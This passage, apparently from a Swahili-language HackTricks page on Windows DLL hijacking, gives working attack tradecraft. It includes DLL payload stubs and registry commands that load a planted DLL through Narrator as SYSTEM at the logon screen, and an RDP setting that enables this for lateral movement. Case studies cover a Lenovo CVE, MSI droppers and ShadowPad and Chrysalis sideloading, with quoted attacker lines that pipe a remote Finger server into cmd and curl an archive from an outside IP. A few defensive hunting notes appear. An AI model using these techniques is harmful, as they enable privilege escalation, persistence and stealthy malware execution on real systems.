- Filter: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia path iliyo hapo juu.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Hijack ya kawaida itazungumza/itaangazia UI. Ili kubaki kimya, wakati wa attach enumerates Narrator threads, fungua main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) na uipige `SuspendThread`; endelea katika thread yako mwenyewe. Tazama PoC kwa code kamili.<sup>[[8]](#references)</sup>

Trigger and persistence kupitia Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa kutumia yaliyo hapo juu, kuanzisha Narrator hupakia DLL iliyopandikizwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako inatekelezwa kama SYSTEM kwenye secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwenye host, kwenye logon screen bonyeza CTRL+WIN+ENTER ili kuzindua Narrator; DLL yako inatekelezwa kama SYSTEM kwenye secure desktop.
- Execution husimama RDP session inapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza ku-clone built-in Accessibility Tool (AT) registry entry (kwa mfano, CursorIndicator), kuihariri ili ielekeze kwenye binary/DLL yoyote, kui-import, kisha kuweka `configuration` kwenye jina hilo la AT. Hii hu-proxy arbitrary execution chini ya Accessibility framework.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha HKLM values kunahitaji admin rights.
- Logic yote ya payload inaweza kuwekwa kwenye `DLL_PROCESS_ATTACH`; exports hazihitajiki.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Case hii inaonyesha **Phantom DLL Hijacking** katika Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` iliyoko kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM chini ya context ya user aliye-login.
- **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo kuruhusu local users kuweka arbitrary files.
- **DLL Search Behavior**: Hu jaribu kupakia `hostfxr.dll` kutoka working directory yake kwanza na hu-log "NAME NOT FOUND" ikiwa haipo, ikionyesha local directory search precedence.

### Exploit Implementation

Attacker anaweza kuweka malicious `hostfxr.dll` stub kwenye directory hiyo hiyo, akitumia DLL inayokosekana ili kufanikisha code execution chini ya context ya user:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Mashambulizi

1. Kama standard user, weka `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshe saa 9:30 AM katika muktadha wa current user.
3. Ikiwa administrator ameingia wakati task inaendeshwa, DLL hasidi itaendeshwa katika session ya administrator ikiwa na medium integrity.
4. Unganisha standard UAC bypass techniques ili kuongeza privilege kutoka medium integrity hadi SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading kupitia Signed Host (wsc_proxy.exe)

Threat actors mara kwa mara huunganisha droppers za MSI-based na DLL side-loading ili kuendesha payloads chini ya trusted, signed process.<sup>[[10]](#references)</sup>

Muhtasari wa Chain
- User anapakua MSI. CustomAction huendeshwa kimya wakati wa GUI install (kwa mfano, LaunchApplication au VBScript action), na kujenga upya next stage kutoka embedded resources.
- Dropper huandika EXE halali, signed na DLL hasidi kwenye directory moja (mfano wa pair: wsc_proxy.exe iliyosainiwa na Avast + wsc.dll inayodhibitiwa na attacker).
- Signed EXE inapoanzishwa, Windows DLL search order hupakia kwanza wsc.dll kutoka working directory, na kutekeleza attacker code chini ya signed parent (ATT&CK T1574.001).

MSI analysis (cha kutafuta)
- CustomAction table:
- Tafuta entries zinazoendesha executables au VBScript. Mfano wa suspicious pattern: LaunchApplication inayotekeleza embedded file kwa background.
- Kwenye Orca (Microsoft Orca.exe), kagua CustomAction, InstallExecuteSequence na Binary tables.
- Embedded/split payloads kwenye MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta fragments nyingi ndogo ambazo huunganishwa na ku-decryptiwa na VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Weka faili hizi mbili katika folda moja:
- wsc_proxy.exe: host halali iliyotiwa sahihi (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
- wsc.dll: DLL ya mshambuliaji. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na u-forward exports zinazohitajika kwenye library halisi huku ukiendesha payload katika DllMain.
- Tengeneza DLL payload ndogo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia framework ya proxying (kwa mfano, DLLirant/Spartacus) ili kuzalisha forwarding DLL ambayo pia hu-execute payload yako.

- Mbinu hii hutegemea utatuzi wa majina ya DLL unaofanywa na host binary. Ikiwa host inatumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindikana.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na lazima zizingatiwe wakati wa kuchagua host binary na export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ilieleza jinsi Ink Dragon inavyodeploy ShadowPad kwa kutumia **three-file triad** ili kujichanganya na software halali huku ikiweka core payload ikiwa encrypted kwenye disk:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – vendors kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers hubadilisha jina la executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature hubaki valid.
2. **Malicious loader DLL** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL kwa kawaida huwa MFC binary iliyofichwa kwa framework ya ScatterBrain; kazi yake pekee ni kutafuta encrypted blob, kuidecrypt, na kufanya reflective mapping ya ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye directory hiyo hiyo. Baada ya memory-mapping payload iliyodecrypted, loader hufuta TMP file ili kuharibu forensic evidence.

Tradecraft notes:

* Kubadilisha jina la signed EXE (huku ukiweka `OriginalFileName` ya awali kwenye PE header) huifanya ijifanye kuwa Windows binary huku ikihifadhi vendor signature, kwa hiyo iga tabia ya Ink Dragon ya kuweka binaries zinazoonekana kama `conhost.exe` ambazo kwa kweli ni utilities za AMD/NVIDIA.
* Kwa kuwa executable hubaki trusted, controls nyingi za allowlisting zinahitaji tu malicious DLL yako iwe karibu nayo. Zingatia ku-customize loader DLL; signed parent kwa kawaida inaweza kuendeshwa bila kubadilishwa.
* ShadowPad’s decryptor inatarajia TMP blob iwe karibu na loader na iwe writable ili iweze ku-zero file baada ya mapping. Weka directory ikiwa writable hadi payload ipakie; ikiwa tayari iko memory, TMP file inaweza kufutwa kwa usalama kwa ajili ya OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators huunganisha DLL sideloading na LOLBAS ili custom artifact pekee iliyo kwenye disk iwe malicious DLL karibu na trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell hu-spawn `cmd.exe /c`, huvuta commands kutoka kwa Finger server, na kuzisambaza kwa `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` huvuta TCP/79 text; `| cmd` hu-execute response ya server, hivyo operators wanaweza ku-rotate second stage server-side.

- **Built-in download/extract:** Download archive yenye benign extension, ifungue, kisha stage sideload target pamoja na DLL chini ya random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` huficha progress na kufuata redirects; `tar -xf` hutumia tar iliyojengwa ndani ya Windows.

- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe process iliyoundwa na CIM wakati inapakia DLL iliyo colocated:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Hufanya kazi na binaries zinazopendelea local DLLs (kwa mfano, `intelbq.exe`, `nearby_share.exe`); payload (kwa mfano, Remcos) huendeshwa chini ya trusted name.

- **Hunting:** Weka alert kwenye `forfiles` wakati `/p`, `/m`, na `/c` zinapoonekana pamoja; hali hii si ya kawaida nje ya admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Lotus Blossom intrusion ya hivi karibuni ilitumia trusted update chain kupeleka NSIS-packed dropper iliyostage DLL sideload pamoja na fully in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka kuwa **HIDDEN**, huweka Bitdefender Submission Wizard `BluetoothService.exe` iliyobadilishwa jina, malicious `log.dll`, na encrypted blob `BluetoothService`, kisha hu-launch EXE.
- Host EXE hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hu-mmap-load blob; `LogWrite` hu-decrypt kwa custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material iliyotokana na hash ya awali), hu-overwrite buffer kwa plaintext shellcode, hu-free temps, na ku-jump kwenye hiyo.
- Ili kuepuka IAT, loader huresolve APIs kwa ku-hash export names kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x100019**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha na salted target hashes.

Main shellcode (Chrysalis)
- Hudecrypt PE-like main module kwa kurudia add/XOR/sub kwa key `gQ2JR&9;` kupitia passes tano, kisha hu-load `Kernel32.dll` → `GetProcAddress` ili kumaliza import resolution.
- Hujenga upya DLL name strings wakati wa runtime kupitia per-character bit-rotate/XOR transforms, kisha hu-load `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia second resolver inayopita kwenye **PEB → InMemoryOrderModuleList**, huchanganua kila export table katika 4-byte blocks kwa Murmur-style mixing, na hutumia `GetProcAddress` tu ikiwa hash haijapatikana.

Embedded configuration & C2
- Config iko ndani ya file ya `BluetoothService` iliyodropped kwenye **offset 0x30808** (size **0x980**) na hu-decryptiwa kwa RC4 kwa key `qwhvb^435h&*7`, ikifichua C2 URL na User-Agent.
- Beacons huunda dot-delimited host profile, hu-prepend tag `4Q`, kisha hu-encrypt kwa RC4 kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Responses hu-decryptiwa kwa RC4 na ku-dispatchiwa na tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode hudhibitiwa na CLI args: bila args = install persistence (service/Run key) inayoelekeza kwenye `-i`; `-i` hu-relaunch self kwa `-k`; `-k` huruka install na ku-run payload.

Alternate loader observed
- Intrusion hiyo hiyo iliweka Tiny C Compiler na ku-execute `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, ikiwa na `libtcc.dll` kando yake. C source iliyotolewa na attacker ilikuwa na embedded shellcode, ilicompile na ku-run in-memory bila kugusa disk kwa PE. Iga kwa:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hatua hii ya compile-and-run inayotegemea TCC iliingiza `Wininet.dll` wakati wa runtime na kuchukua shellcode ya hatua ya pili kutoka kwenye URL iliyowekwa moja kwa moja kwenye code, hivyo kutoa loader inayobadilika ambayo hujifanya kuwa compile run.

## Signed-host sideloading with export proxying + host thread parking

Baadhi ya DLL sideloading chains huongeza **stability engineering** ili host halali iendelee kuwa hai kwa muda wa kutosha kupakia stages zinazofuata kwa usahihi, badala ya ku-crash baada ya malicious DLL kupakiwa.<sup>[[11]](#references)</sup>

Muundo ulioonekana
- Weka trusted EXE pamoja na malicious DLL kwa kutumia jina la dependency linalotarajiwa, kama `version.dll`.
- Malicious DLL **hu-proxy kila export inayotarajiwa** kwenda kwenye system DLL halisi, kwa mfano `%SystemRoot%\\System32\\version.dll`, ili import resolution iendelee kufanikiwa na host process iendelee kufanya kazi.
- Baada ya kupakiwa, malicious DLL **hu-patch entry point ya host** ili main thread iingie kwenye infinite `Sleep` loop badala ya kutoka au kuendesha code paths zinazoweza kusitisha process.
- Thread mpya hufanya kazi halisi ya malicious: kufungua jina au path ya DLL ya next-stage (RC4/XOR hutumika mara nyingi), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Kawaida DLL proxying huhifadhi API compatibility, lakini haihakikishi kuwa host itaendelea kuwa hai kwa muda wa kutosha kwa stages zinazofuata.
- Kuweka main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuweka signed process ikiwa resident wakati loader inafanya decryption, staging, au network bootstrap kwenye worker thread.
- Hunting inayolenga `DllMain` yenye kutia shaka pekee inaweza kukosa muundo huu ikiwa tabia ya kuvutia hutokea baada ya host entry point ku-patchiwa na secondary thread kuanzishwa.

Minimal workflow
1. Nakili signed host EXE na utambue DLL ambayo inaresolve kutoka kwenye local directory.
2. Build proxy DLL inayotoa functions zilezile na kuzi-forward kwenda kwenye legitimate DLL.
3. Kwenye `DllMain(DLL_PROCESS_ATTACH)`, tengeneza worker thread.
4. Kutoka kwenye thread hiyo, patch host entry point au main thread start routine ili ifanye loop kwenye `Sleep`.
5. Decrypt jina/config ya next-stage DLL na uite `LoadLibrary` au u-manual-map payload.

Defensive pivots
- Signed processes zinazopakia `version.dll` au libraries nyingine zinazotumika sana kutoka kwenye application directory yao badala ya `System32`.
- Memory patches kwenye process entry point muda mfupi baada ya image load, hasa jumps/calls zinazoelekezwa kwenda `Sleep`/`SleepEx`.
- Threads zinazoundwa na proxy DLL ambazo mara moja huita `LoadLibrary` kwenye DLL ya pili yenye jina lililodecryptiwa.
- Full-export proxy DLLs zilizowekwa karibu na vendor executables ndani ya writable staging directories kama `ProgramData`, `%TEMP%`, au unpacked archive paths.

## References

- [1] [Red Canary – Intelligence Insights: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Inatumia Malware Mpya Kulenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wakati DLL Hijacks Zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Uchambuzi wa kina wa toolkit ya Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element ya `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element ya `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element ya `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element ya `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element ya `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element ya `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
